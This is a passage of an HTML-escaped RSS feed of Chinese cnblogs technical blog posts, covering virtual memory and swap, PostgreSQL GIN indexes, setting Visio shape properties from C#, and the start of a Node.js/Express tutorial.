&lt;p&gt;在上图中，每个 PTE 额外添加了三个控制位， SUP 位表示进程是否必须运行内核模式，READ和WRITE位分别控制页面的读写权限。如果有指令违反了这些控制权限，那么 CPU 会触发一个故障，并将控制传递给内核中的异常处理程序。该种异常一般称为&lt;strong&gt;段错误(segmentation fault)&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&quot;段-和-页&quot;&gt;段 和 页&lt;/h2&gt;
&lt;p&gt;我们明白了页，页是操作系统为了管理主存方便而划分的，对用户不可见。但是思考这种情况，假设一个页的大小是1M。但是某个程序数据加起来也就0.5M，所以在内存和磁盘进行页交换明显的浪费内存了。所以还一种划分方式是&lt;strong&gt;分段&lt;/strong&gt;。上面那个例子，我将该段划分为0.5M，在内存和磁盘之间交换，这样就避免了浪费。&lt;/p&gt;
&lt;p&gt;段是信息的逻辑单元，是根据用户需求而灵活划分的，所以大小不固定，对用户是可见的，提供的是二维地址空间。&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;对于段，我没找到比较好的资料，所以也没有理解的更清楚，网上的很多文章都相互抄袭。据我所了解，汇编程序员是可以直接操作段的，&lt;strong&gt;但是我们写高级语言的程序员有相应的API能进行段操作吗？&lt;/strong&gt;所以对于段的相关知识，真心不了解，也希望了解的同学可以在留言区指点批评，或者留言相关的文章链接。我回头会再补充这篇博客。谢谢&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;swap分区的作用&quot;&gt;swap分区的作用&lt;/h2&gt;
&lt;p&gt;熟悉linux的同学，应该知道linux有一个swap分区。Swap空间的作用可简单描述为：当系统的物理内存不够用的时候，就需要将物理内存中的一部分空间释放出来，以供当前运行的程序使用。那些被释放的空间可能来自一些很长时间没有什么操作的程序，这些被释放的空间中的信息被临时保存到Swap空间中，等到那些程序要运行时，再从Swap中恢复保存的数据到内存中。系统总是在物理内存不够时，才进行Swap交换。&lt;/p&gt;
&lt;p&gt;你电脑打开了一个音乐播放器，但是也没播放歌曲，然后你几天不关机，也一直没关闭这个音乐播放器，随着运行的程序越来越多，内存快不够用了，所以操作系统就选择将这个音乐播放器的内存状态(包括堆栈状态等)都写到磁盘上的swap区进行保存。这样就腾出来一部分内存供其他需要运行的程序使用。你啥时候想听歌了，就找到了这个音乐播放器程序操作。此时， 系统会从磁盘中的swap区重新读取该音乐播放器的相关信息，送回内存接着运行。&lt;/p&gt;
&lt;p&gt;在window下也有类作用的硬盘空间，属于对用户不可见的匿名磁盘空间(在C盘)。&lt;/p&gt;
&lt;h2 id=&quot;特别注意按照字面意思swap交换区也可以称为虚拟内存&quot;&gt;&lt;strong&gt;特别注意：按照字面意思，swap交换区也可以称为虚拟内存&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;硬盘上的swap交换区，其实就相当于承担了内存的作用(只是速度很慢罢了)。swap交换区起到了扩大内存的作用。所以从某些意义上来讲，swap区也可以叫做虚拟内存，但是&lt;strong&gt;这个虚拟内存是字面意思&lt;/strong&gt;。和我们本文当中站在计算机系统的角度来解释的虚拟内存不是一个概念。所以特别注意这一点。因为有些人理解的虚拟内存，就是swap交互区。&lt;strong&gt;此虚拟内存非彼虚拟内存&lt;/strong&gt;，所以明白各自的概念和作用。不然和其他人讨论虚拟内存，可能出现驴头不对马嘴的情况。&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;linux环境下叫做swap分区，window下这块区域没叫做swap分区，就直接按照字面意思叫做&quot;虚拟内存&quot;了。所以两个含义不同的虚拟内存，读者一定要搞清楚了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;百度百科上对虚拟内存的解释非常混乱&quot;&gt;百度百科上对&lt;strong&gt;虚拟内存&lt;/strong&gt;的解释非常混乱&lt;/h2&gt;
&lt;p&gt;关于虚拟内存,看了&lt;a href=&quot;https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98&quot;&gt;百度百科&lt;/a&gt;的内容，有些地方解释的比较混乱，有些地方是对的，但是有些地方解释的是关于swap分区的内容。如果光从字面意思来看，swap交换区的确可以称为虚拟内存，但是此虚拟内存非彼虚拟内存。百度百科关于这点的介绍比较混乱，百度百科的内容比较多，但是没分清这一点，只会越来越混乱。我又查了&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98&quot;&gt;维基百科&lt;/a&gt;的内容，该词条内容不长，但是下面这段话很重要。&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;注意：虚拟内存不只是“用磁盘空间来扩展物理内存”的意思——这只是扩充内存级别以使其包含硬盘驱动器而已。把内存扩展到磁盘只是使用虚拟内存技术的一个结果，它的作用也可以通过覆盖或者把处于不活动状态的程序以及它们的数据全部交换到磁盘上等方式来实现。对虚拟内存的定义是基于对地址空间的重定义的，即把地址空间定义为“连续的虚拟内存地址”，以借此“欺骗”程序，使它们以为自己正在使用一大块的“连续”地址。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以我认为百度百科的解释是混乱的，而维基百科上的应该才是正确的。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;两篇关于内存的文章都写完了。因为本人才疏学浅，若有理解错误或解释不清楚的地方，希望各位读者打脸批评。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr/&gt;
</description>
<pubDate>Thu, 09 Nov 2017 14:00:00 +0000</pubDate>
<dc:creator>eleven_yw</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yaoxiaowen/p/7805964.html</dc:identifier>
</item>
<item>
<title>浅谈postgresql的GIN索引(通用倒排索引) - 非我在</title>
<link>http://www.cnblogs.com/flying-tiger/p/6704931.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/flying-tiger/p/6704931.html</guid>
<description>&lt;h2 id=&quot;倒排索引原理&quot;&gt;1.倒排索引原理&lt;/h2&gt;
&lt;p&gt;倒排索引来源于搜索引擎的技术，可以说是搜索引擎的基石。正是有了倒排索引技术，搜索引擎才能有效率的进行数据库查找、删除等操作。在详细说明倒排索引之前，我们说一下与之相关的正排索引并与之比较。&lt;/p&gt;
&lt;h3 id=&quot;正排索引&quot;&gt;1.1正排索引&lt;/h3&gt;
&lt;p&gt;在搜索引擎中，正排表是以文档的ID为关键字，表中记录文档中每个字的位置信息，查找时扫描表中每个文档中字的信息直到找出所有包含查询关键字的文档。&lt;br/&gt;正排表结构如图1所示，这种组织方法在建立索引的时候结构比较简单，建立比较方便且易于维护;因为索引是基于文档建立的，若是有新的文档加入，直接为该文档建立一个新的索引块，挂接在原来索引文件的后面。若是有文档删除，则直接找到该文档号文档对应的索引信息，将其直接删除。但是在查询的时候需对所有的文档进行扫描以确保没有遗漏，这样就使得检索时间大大延长，检索效率低下。&lt;br/&gt;尽管正排表的工作原理非常的简单，但是由于其检索效率太低，除非在特定情况下，否则实用性价值不大。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/579102/201711/579102-20171109213621263-1728868260.png&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;倒排索引&quot;&gt;1.2倒排索引&lt;/h3&gt;
&lt;p&gt;倒排表以字或词为关键字进行索引，表中关键字所对应的记录表项记录了出现这个字或词的所有文档，一个表项就是一个字表段，它记录该文档的ID和字符在该文档中出现的位置情况。&lt;br/&gt;由于每个字或词对应的文档数量在动态变化，所以倒排表的建立和维护都较为复杂，但是在查询的时候由于可以一次得到查询关键字所对应的所有文档，所以效率高于正排表。在全文检索中，检索的快速响应是一个最为关键的性能，而索引建立由于在后台进行，尽管效率相对低一些，但不会影响整个搜索引擎的效率。&lt;br/&gt;倒排表的结构图如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/579102/201711/579102-20171109213806903-1456787584.png&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;h2 id=&quot;postgresql中的倒排索引&quot;&gt;2.postgresql中的倒排索引&lt;/h2&gt;
&lt;h3 id=&quot;概述&quot;&gt;2.1 概述&lt;/h3&gt;
&lt;p&gt;GIN(Generalized Inverted Index, 通用倒排索引)是一个存储对(key, posting list)集合的索引结构，其中key是一个键值，而posting list 是一组出现过key的位置。如(‘hello’, ’14:2 23:4’)中，表示hello在14:2和23:4这两个位置出现过，在PG中这些位置实际上就是元组的tid。&lt;/p&gt;
&lt;p&gt;在表中的每一个属性，在建立索引时，都可能会被解析为多个键值，所以同一个元组的tid可能会出现在多个key的posting list中。&lt;/p&gt;
&lt;p&gt;通过这种索引结构可以快速的查找到包含指定关键字的元组，因此GIN索引特别适用于支持全文搜索，而PG的GIN索引模块也就是为了支持全文搜索而开发的。&lt;/p&gt;
&lt;h3 id=&quot;扩展性&quot;&gt;2.2 扩展性&lt;/h3&gt;
&lt;p&gt;GIN索引具有很好的可扩展性，允许在开发自定义数据类型时由该数据类型的领域专家（而非数据库专家）设计适当的访问方法，这些访问方法只需考虑对于数据类型本身的语义处理，GIN索引自身可以处理并发控制、日志记录、搜索树结构等操作。&lt;/p&gt;
&lt;p&gt;定义一个GIN访问方法所要做的就是实现3个用户定义的方法，这些方法定义了键值、键值与键值之间的关系、被索引值、能够使用索引的查询以及部分匹配。这些方法是:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;int compare(Datum a, Datum b)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;比较两个键（不是被索引项）并且返回一个整数，整数可以是小于零、零、大于零， 分别表示第一个键小于、等于、大于第二个键。空值键不会被传递给这个函数。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Datum *extractValue(Datum itemValue, int32 *nkeys, bool **nullFlags)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;根据参数inputValue生成一个键值数组，并返回其指针，键值数组中元素的个数存放在另一个参数nkeys中。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Datum *extractQuery(Datum query, int32 *nkeys, StrategyNumber n, bool
**pmatch, Pointer **extra_data, bool **nullFlags, int32 *searchMode)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;根据参数query生成一个用于查询的键值数组，并返回其指针。&lt;/p&gt;
&lt;p&gt;extractQuery通过参数n指定的操作符策略号来决定query的数据类型以及需要提取的键值，返回键值数组的长度存放在nkeys参数中。如果query中不包含键值，则nkeys可以为0或者-1：nkeys = 0 表示索引中所有值都满足查询，将执行完全索引扫描(查询null时是这样); nkeys = -1 表示索引中没有键值满足查询，跳过索引扫描。&lt;/p&gt;
&lt;p&gt;在部分匹配时，输出参数pmatch记录返回的键值数组中的每一个键值是否请求部分匹配。&lt;/p&gt;
&lt;p&gt;输出参数extra_data用来向consistent和comparPartial方法传递用户自定义需要的数据。&lt;/p&gt;
&lt;p&gt;一个操作符类必须提供一个函数检查一个被索引的项是否匹配查询。有两种形式， 一个布尔函数consistent，以及一个三元函数triConsistent。 triConsistent覆盖了两者的功能，因此提供一个足矣。但是， 如果布尔函数的计算代价要更低，两者都提供就会有好处。如果只提供布尔变体， 一些基于在取得所有键之前拒绝索引项的优化将会被禁用。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;bool consistent(bool check[], StrategyNumber n, Datum query, int32 nkeys, Pointer extra_data[], bool *recheck, Datum queryKeys[], bool nullFlags[])&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果一个被索引项满足（如果重新检查指示被返回，则表示可能满足）有策略号 n的查询操作符，则返回 TRUE。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;GinTernaryValue triConsistent(GinTernaryValue check[], StrategyNumber n, Datum query, int32 nkeys, Pointer extra_data[], Datum queryKeys[], bool nullFlags[])&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;triConsistent类似于consistent，但不是一个布尔的 check[]，对每个键有三种可能值：GIN_TRUE、 GIN_FALSE和GIN_MAYBE。GIN_FALSE和 GIN_TRUE具有和常规布尔值相同的含义。GIN_MAYBE 意味着键的存在未知。当GIN_MAYBE值出现时，如果项匹配 （不管该索引项是否包含对应的查询键），该函数应该只返回 GIN_TRUE。 同样地，如果项不匹配（不管它是否包含 GIN_MAYBE 键），该函数必须只返回 GIN_FALSE。 如果结果依赖于 GIN_MAYBE 项，即无法根据已知查询键确认或拒绝匹配， 该函数必须返回 GIN_MAYBE。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;int comparePartial(Datum partial_key, Datum key, StrategyNumber n, Pointer extra_data)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;将部分匹配的查询与索引值进行比较，返回值为负值表示两者不匹配，但继续索引扫描；返回值为0表示两者匹配；返回值为正值表示停止扫描。&lt;/p&gt;
&lt;p&gt;要支持&quot;部分匹配&quot;查询，一个操作符类必须提供comparePartial 方法，并且它的extractQuery方法必须在遇到一个部分匹配查询时设置 pmatch参数&lt;/p&gt;
&lt;p&gt;所以在PG中添加一种新的数据类型并且让GIN支持该数据类型，则需要完成以下步骤：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;
1.添加数据类型

2.为新数据类型实现并注册各种操作符所需要的函数，然后创建新类型的操作符

3.用CREATE OPERATOR CLASS为新的数据类型创建一个操作符类，该语句需要指定GIN索引所需要的3个支持函数&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对以上的函数云里雾里？ 我建议你可以看看contrib\cube模块。这个模块实现了一种数据类型cube来表示多维立方体。同样他实现了以上3个函数(虽然针对的是gist和b-tree，但是大体相似)。&lt;/p&gt;
&lt;h3 id=&quot;gin索引结构&quot;&gt;2.3 GIN索引结构&lt;/h3&gt;
&lt;h4 id=&quot;逻辑结构&quot;&gt;2.3.1 逻辑结构&lt;/h4&gt;
&lt;p&gt;GIN索引在逻辑上可以看成一个relation，该relation有两种结构：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;只索引基表的一列&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/579102/201711/579102-20171109214024700-635390362.png&quot;/&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;索引基表的多列(复合、多列索引)&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/579102/201711/579102-20171109214133403-53790500.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;那我们可以知道在这种结构下，对于基表中不同列的相同的key，在GIN索引中也会当作不同的key来处理。&lt;/p&gt;
&lt;h4 id=&quot;物理结构&quot;&gt;2.3.2 物理结构&lt;/h4&gt;
&lt;p&gt;GIN索引在物理存储上包含如下内容：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;1. Entry：GIN索引中的一个元素，可以认为是一个词位，也可以理解为一个key

2. Entry tree：在Entry上构建的B树

3. posting list：一个Entry出现的物理位置(heap ctid, 堆表行号)的链表

4. posting tree：在一个Entry出现的物理位置链表(heap ctid, 堆表行号)上构建的B树，所以posting tree的KEY是ctid，而entry tree的KEY是被索引的列的值

5. pending list：索引元组的临时存储链表，用于fastupdate模式的插入操作&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从上面可以看出GIN索引主要由Entry tree和posting tree（or posting list）组成，其中Entry tree是GIN索引的主结构树，posting tree是辅助树。&lt;/p&gt;
&lt;p&gt;entry tree类似于b+tree，而posting tree则类似于b-tree。&lt;/p&gt;
&lt;p&gt;另外，不管entry tree还是posting tree，它们都是按KEY有序组织的。&lt;/p&gt;
&lt;h3 id=&quot;gin索引的insert和fastupdate优化&quot;&gt;2.4 GIN索引的insert和fastupdate优化&lt;/h3&gt;
&lt;p&gt;GIN索引的插入操作与btree索引不同，对于btree索引，基表增加一行，btree索引也是增加一个索引项。而对于GIN索引基表增加一行，GIN索引可能需要增加多个索引项。所以GIN索引的插入是低效的。所以PG为了解决这个问题，实现了两种插入模式：&lt;/p&gt;
&lt;h4 id=&quot;正常模式&quot;&gt;2.4.1. 正常模式&lt;/h4&gt;
&lt;p&gt;在该模式下，基表元组产生的新的GIN索引，会被立即插入到GIN索引&lt;/p&gt;
&lt;h4 id=&quot;fastupdate模式&quot;&gt;2.4.2. fastupdate模式&lt;/h4&gt;
&lt;p&gt;在该模式下，基表元组产生的新的GIN索引，会被插入到pending list中，而pending list会在一定条件下批量的插入到GIN索引中&lt;/p&gt;
&lt;p&gt;下面就说明一下fastupdate模式的插入。&lt;/p&gt;
&lt;h5 id=&quot;开启和关闭fastupdate模式&quot;&gt;2.4.2.1 开启和关闭fastupdate模式&lt;/h5&gt;
&lt;p&gt;可以通过create index 的WITH FASTUPDATE = OFF来关闭fastupdate模式，默认情况下是开启fastupdate模式&lt;/p&gt;
&lt;h5 id=&quot;对索引扫描的影响&quot;&gt;2.4.2.2 对索引扫描的影响&lt;/h5&gt;
&lt;p&gt;在fastupdate模式下，新的索引元组以追加的方式插入到pending list中，不会进行任何的排序和去重操作，所以，在扫描时，只能顺序扫描，因此pending list的扫描效率是非常低的，必须保证pending list的大小不要太大&lt;/p&gt;
&lt;h4 id=&quot;对插入的影响&quot;&gt;2.4.2.3 对插入的影响&lt;/h4&gt;
&lt;p&gt;通常情况下，在fastupdate模式下，基表的更新效率是比较高的，但是如果一个事务的更新刚好让pending list到达临界点，而导致合并操作，则会使该事务比正常的事务慢很多&lt;/p&gt;
&lt;h4 id=&quot;pending-list的合并&quot;&gt;2.4.2.4 pending list的合并&lt;/h4&gt;
&lt;p&gt;把pending list的索引元组合并到GIN索引树上有2种触发条件：&lt;/p&gt;
&lt;p&gt;1) 当pending list所占空间大于work_mem时&lt;/p&gt;
&lt;p&gt;PS(有gin_pending_list_limit参数的版本，通过gin_pending_list_limit参数来控制，而非work_mem)&lt;/p&gt;
&lt;p&gt;2) 在vacuum 索引的基表时（包括autovacuum在内）&lt;/p&gt;
&lt;p&gt;因此可以根据autovacuum的间隔时间和work_mem来控制pending list的大小，避免其过大而拖慢扫描速度&lt;/p&gt;
&lt;p&gt;在pending list合并时，其采用与GIN索引构建时相同的方式，即先把pending list内的数据，组织成一个RB树，然后再把RB树合并到GIN索引上。RB树可以把pending list中无序的数据变成有序，并且可以合并重复key的项，提高插入效率。&lt;/p&gt;
&lt;h3 id=&quot;gin索引的vacuum&quot;&gt;2.5 GIN索引的vacuum&lt;/h3&gt;
&lt;p&gt;GIN索引的vacuum是用来清理无用的posting list或者posting tree的，GIN索引的vacuum与btree索引的vacuum一样，提供了两个接口ginbulkdelete和ginvacuumcleanup。&lt;/p&gt;
&lt;p&gt;GIN索引的vacuum主要是清理entry tree和posting tree，如果entry的posting list为空了，vacuum依然不会删除该entry，说明entry tree中的entry永远不会被删除；对于posting tree，如果posting tree也空了，在系统依然会把posting tree的root页面保留，并关联到entry上面。&lt;/p&gt;
&lt;hr/&gt;&lt;h2 id=&quot;小结&quot;&gt;3.小结&lt;/h2&gt;
&lt;p&gt;这篇文章主要开个头，同时也主要是一篇学习笔记，下一篇会多写写自己的理解，会着重从代码角度解读GIN索引以及分析实例等。&lt;/p&gt;
&lt;p&gt;敬请期待~&lt;br/&gt;引用如下：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://yq.aliyun.com/articles/69250#&quot; class=&quot;uri&quot;&gt;https://yq.aliyun.com/articles/69250#&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/maybe2030/p/4791611.html&quot; class=&quot;uri&quot;&gt;http://www.cnblogs.com/maybe2030/p/4791611.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://my.oschina.net/Kenyon/blog/366505&quot; class=&quot;uri&quot;&gt;https://my.oschina.net/Kenyon/blog/366505&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/zhangzeyuaaa/article/details/48676775&quot; class=&quot;uri&quot;&gt;http://blog.csdn.net/zhangzeyuaaa/article/details/48676775&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.chinaunix.net/uid-20726500-id-5090449.html&quot; class=&quot;uri&quot;&gt;http://blog.chinaunix.net/uid-20726500-id-5090449.html&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 09 Nov 2017 13:50:00 +0000</pubDate>
<dc:creator>非我在</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/flying-tiger/p/6704931.html</dc:identifier>
</item>
<item>
<title>C# 取Visio模型信息的简易方法 - 衆尋</title>
<link>http://www.cnblogs.com/ZXdeveloper/p/7810850.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ZXdeveloper/p/7810850.html</guid>
<description>&lt;p&gt;最近的一个项目，要求导出Visio图纸，因为是建筑类的，所以，需要设置墙壁，门，房间等信息的参数。&lt;/p&gt;
&lt;p&gt;拿墙壁为例，选中墙壁模型，右键属性，会弹出以下对话框。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109180033778-315354605.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;需要设置墙长、墙壁厚度等一些列信息。&lt;/p&gt;
&lt;p&gt;现在C#操作Visio里例子比较少，所以，花了好久，都没有看到有用的帖子，直到今天下午，在Bing里发现了一个帖子，顿时让我受益匪浅。原贴地址：&lt;a href=&quot;http://mikeborozdin.com/post/reading-and-writing-visio-shape-information-with-c/&quot; target=&quot;_blank&quot;&gt;http://mikeborozdin.com/post/reading-and-writing-visio-shape-information-with-c/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;操作方法如下：&lt;/p&gt;
&lt;p&gt;一、打开Visio的开发者模式&lt;/p&gt;
&lt;p&gt;文件--选项--高级--以开发人员模式运行&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109180504153-786124876.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;二、查看模型的属性&lt;/p&gt;
&lt;p&gt;选中模型--右键显示ShapeSheet，在Visio的下面就会出现模型的所有属性了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109180616138-249935346.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109180641872-1148088035.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下滑，可以在Shape Data里看到此模型的属性信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109180730200-796052121.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;三、C#代码操作&lt;/p&gt;
&lt;p&gt;1、打开墙模型模板&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109181528981-1379736247.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;WALL_M.VSS是墙的模型模板，这个推荐大家用everything搜索一下，就能拿到模板路径了，自己需要哪个去里面找。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2、建立模型并设置参数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109181647403-657160864.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;建立模型很方便，就是用document.Masters属性加模型名称，模型名称在哪呢，其实很好找，就是Visio的模型名称，用汉字就可以。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109181842606-29248021.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;设置模型的参数有两种方式，图片中用粉色框，框起来的部分。&lt;/p&gt;
&lt;p&gt;网上大部分的资料里都是用的第一个方法，这个方法不太方便记忆，而第二个方法就很方便了，也就是本文介绍的简单的方式。&lt;/p&gt;
&lt;p&gt;模型名.Cells[&quot;属性名&quot;].Formula&lt;/p&gt;
&lt;p&gt;属性名，就是ShapeSheet里看到的那些属性，都是String类型，可以直接设置。设置成功以后，就是以下的图了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109182313997-1829633647.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3、遇到的问题&lt;/p&gt;
&lt;p&gt;并不是所有的属性，设置了就一定好使，问题，我也不知道出现在哪，其中一个就是填充属性。&lt;/p&gt;
&lt;p&gt;FillForegnd是填充属性，设置代码为&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
m_sp4.Cells[&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;FillForegnd&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;].Formula = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;RGB(0,0,0)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;通过参数查看，设置成功&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109182632028-1004310238.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;并且右键模型，格式--填充，如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109182752950-589412003.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其实已经设置成功了，但是模型的填充颜色不变，这个就很尴尬了，但是如果用基础模型，就是方形、圆形那些基础模型，就可以显示填充为黑色，所以不知道问题在哪里。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://files.cnblogs.com/files/ZXdeveloper/WpfApp1.zip&quot; target=&quot;_blank&quot;&gt;DEMO&lt;/a&gt;&lt;/p&gt;

</description>
<pubDate>Thu, 09 Nov 2017 10:32:00 +0000</pubDate>
<dc:creator>衆尋</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/ZXdeveloper/p/7810850.html</dc:identifier>
</item>
<item>
<title>用Nodejs+Express搭建web，nodejs路由和Ajax传数据并返回状态，nodejs+mysql通过ajax获取数据并写入数据库 - 小熊一乐</title>
<link>http://www.cnblogs.com/mibear/p/nodejs.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/mibear/p/nodejs.html</guid>
<description>&lt;blockquote readability=&quot;12&quot;&gt;
&lt;p&gt;小编自学Nodejs，看了好多文章发现都不全，而且好多都是一模一样的&lt;/p&gt;
&lt;p&gt;当然了，这只是基础的demo，经供参考，但是相信也会有收获&lt;/p&gt;
&lt;p&gt;今天的内容是用Nodejs+Express搭建基本的web，然后呢nodejs路由和Ajax之间的数据传输，也就是表单提交，然后在用nodejs把数据写入mysql数据库&lt;/p&gt;
&lt;p&gt;用到的东西比较多，但是还是很有趣的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;1.安装node.js&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;安装node.js，直接去官网下载然后根据需求点击下一步就好了&lt;/p&gt;
&lt;p&gt;Node.js安装包及源码下载地址为：&lt;a href=&quot;https://nodejs.org/en/download/&quot; target=&quot;_blank&quot;&gt;https://nodejs.org/en/download/&lt;/a&gt; （英文官网）&lt;/p&gt;
&lt;p&gt;&lt;a title=&quot;http://nodejs.cn/download/&quot; href=&quot;http://nodejs.cn/download/&quot; target=&quot;_blank&quot;&gt;http://nodejs.cn/download/&lt;/a&gt;（中文官网），可以下载 LTS(长期支持版本)&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;2.安装npm&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;node.js总，npm可是很重要的，NPM是随同NodeJS一起安装的包管理工具，能解决NodeJS代码部署上的很多问题，而且很多模板都是需要用这个来安装的&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;现在的版本都是已经知道npm，下面说一下需要的命令行（node.js都是用命令行来执行的--CMD）&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;$ npm -v  //测试是否安装成功
2.3.0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
cnpm install npm -g  //安装淘宝镜像，即使用cnpm代替npm，都是一样的&lt;br/&gt;　　　　　　　　　　　　　　只是淘宝镜像安装会快一些，其实感觉都差不多
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;node.js很多的模块， 需要什么模块加加载对应的模块，但是模块有一些是需要&lt;strong&gt;自己安装的&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
$ npm install &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;Module &lt;/span&gt;&lt;span&gt;Name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;  //通用安装模板，Module Name是模板的名称
&lt;/pre&gt;
&lt;pre class=&quot;prettyprint&quot;&gt;
